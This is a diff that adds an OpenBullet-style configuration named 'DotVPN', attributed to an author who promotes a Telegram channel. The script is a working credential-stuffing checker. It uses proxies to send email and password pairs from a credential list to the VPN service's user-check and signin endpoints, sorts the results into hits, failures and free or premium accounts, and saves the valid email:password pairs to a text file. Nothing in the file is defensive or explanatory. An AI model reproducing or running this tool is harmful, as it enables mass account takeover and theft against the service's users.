@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "DotVPN",
+  "SuggestedBots": 30,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-17T04:42:53.7062065-08:00",
+  "AdditionalInfo": "Telegram Channel : T.me/ghoulblack",
+  "RequiredPlugins": [],
+  "Author": "👑LilTOBA👑",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Credentials",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Length FUNCTION Length "{\"email\":\"<USER>\"}" -> VAR "Length" 
+
+#LoginEmail REQUEST POST "https://apache-iv.com/3/user/check" 
+  CONTENT "{\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "Host: apache-iv.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Content-Length: <Length>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"code\":3,\"name\":\"\"}" 
+    KEY "{\"code\":3" 
+  KEYCHAIN Failure OR 
+    KEY "{\"code\":0}" 
+
+#Length FUNCTION Length "{\"email\":\"<USER>\",\"passwd\":\"<PASS>\"}" -> VAR "Ln2" 
+
+#Login REQUEST POST "https://apache-iv.com/3/user/signin" 
+  CONTENT "{\"email\":\"<USER>\",\"passwd\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "Host: apache-iv.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Content-Length: <Ln2>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"code\":2}" 
+  KEYCHAIN Success OR 
+    KEY "{\"code\":0,\"udid" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"premium\":0" 
+
+UTILITY File "DotVPN.txt" AppendLines "<USER>: <PASS> //\\n =============================" 
+
